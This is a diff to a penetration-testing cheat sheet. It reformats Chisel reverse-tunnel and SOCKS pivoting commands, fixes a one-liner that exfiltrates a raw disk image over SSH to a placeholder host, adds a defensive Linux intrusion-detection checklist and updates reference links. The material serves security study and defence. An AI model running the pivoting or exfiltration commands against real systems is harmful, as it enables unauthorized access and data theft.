@@ -1114,21 +1114,29 @@ If you only have Windows systems to deal with, Chisel comes highly recommended. 
 
 On Kali:
 
-    ./chisel server -p 8000 --reverse
+```sh
+./chisel server -p 8000 --reverse
+```
 
 On target:
 
-    .\chisel_windows_386.exe client $LHOST:8000 R:8001:127.0.0.1:9001
+```sh
+.\chisel_windows_386.exe client $LHOST:8000 R:8001:127.0.0.1:9001
+```
 
 Now we are listening on localhost:8001 on kali to forward that traffic to target:9001.
 
 Then, open the Socks server: On target:
 
-    .\chisel_windows_386.exe server -p 9001 --socks5
+```sh
+.\chisel_windows_386.exe server -p 9001 --socks5
+```
 
 On Kali:
 
-    ./chisel client localhost:8001 socks
+```
+./chisel client localhost:8001 socks
+```
 
 
 ## Port forwarding
@@ -1249,7 +1257,150 @@ Encrypted Exfiltration channel:
 *Exfiltrate the contents of an image via SSH to another machine, compressing (-C) the content.*
 
 ```sh
-dd if=/dev/rdisk0s1s2s bs=65536 conv=noerror,sync | ssh -C user@<IP> "cat /tmp/image.dd"
+dd if=/dev/rdisk0s1s2s bs=65536 conv=noerror,sync | ssh -C user@<IP> "cat >/tmp/image.dd"
+```
+
+# Detection
+
+This section cover detection malicious activity on system and could be a good
+list of stuff to clean up.
+
+## Linux
+
+List connected users:
+
+```sh
+w
+who
+```
+
+Linux systems keep a trace of the connections. keeping in memory user, IP and
+even length of the connection:
+
+```sh
+last
+```
+
+List connection errors:
+
+```sh
+lastb
+```
+
+List the recent history the current user:
+
+```sh
+history
+
+su otheruser
+history
+```
+
+Check if there isn't a new user registered:
+
+```sh
+cat /etc/passwd
+awk -F':' '{ print $1}' /etc/passwd
+
+# list only user using shells
+cat /etc/passwd | grep /bin/bash (ou zsh, sh, etc.)
+
+# list available shells on your machine
+cat /etc/shells
+```
+
+Check processes:
+
+```sh
+ps
+ps aux
+top
+lsof -i
+lsof -i -p <PID>
+
+# check files open by a process
+
+lsof -l
+lsof -p <PID>
+```
+
+Check ports:
+
+```sh
+
+# list TCP/UDP open ports
+
+netstat -lntup
+ss -lntup
+
+# use routes
+
+netstat -r
+
+# show routes stats
+
+netstat -s
+ss -s
+```
+
+Check network and routes:
+
+```sh
+ip address
+ip a
+ip route
+```
+
+Check running crons:
+
+```sh
+crontab -l
+crontab -u user -l
+ls -la /etc/cron.daily
+ls -la /etc/cron.hourly
+ls -la /etc/cron.weekly
+```
+
+Quick search modified files (check the [General Find](https://github.com/christalib/yaCTFpl/blob/aleph/manual.md#general-find) section for more detail):
+
+Find files modified in the past 5 days:
+
+```sh
+find / -mtime -5 -ctime -5
+```
+
+Find files modified in the last minute:
+
+```sh
+find / -mmin -1
+```
+
+General logs:
+
+```sh
+cat /var/log/syslog
+cat /var/log/syslog | less
+tail -f -n 5 /var/log/syslog
+cat /var/log/syslog | grep fail
+tail -f /var/log/syslog
+```
+
+Check SSH keys:
+
+```sh
+cat /root/.ssh/authorized_keys
+cat /home/debian/.ssh/authorized_keys
+cat /home/user1/.ssh/authorized_keys
+```
+
+Check /tmp content:
+
+```sh
+ls /tmp
+ls -la /tmp
+ls -la /tmp | more
+less /tmp
+ls -la /tmp | grep xxx
 ```
 
 # Custom Scripts
@@ -1291,13 +1442,14 @@ File authorizations in Linux:
 
 ## Website
 
+* [Absolom.com](https://www.absolomb.com/)
+* [Blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
 * [GTFObins](https://gtfobins.github.io/)
 * [Hacktrics.xyz](https://book.hacktricks.xyz/)
 * [LOLBas](https://lolbas-project.github.io/#)
+* [Net Security](https://net-security.fr/security/commandes-gnu-linux-pour-detecter-une-intrusion/)
 * [PenstestMonkey](http://pentestmonkey.net/)
 * [Red Teaming Experiments](https://ired.team/)
-* [absolom.com](https://www.absolomb.com/)
-* [blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
 * [Security Ramblings](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#reconnaissance)
 
 ## Videos
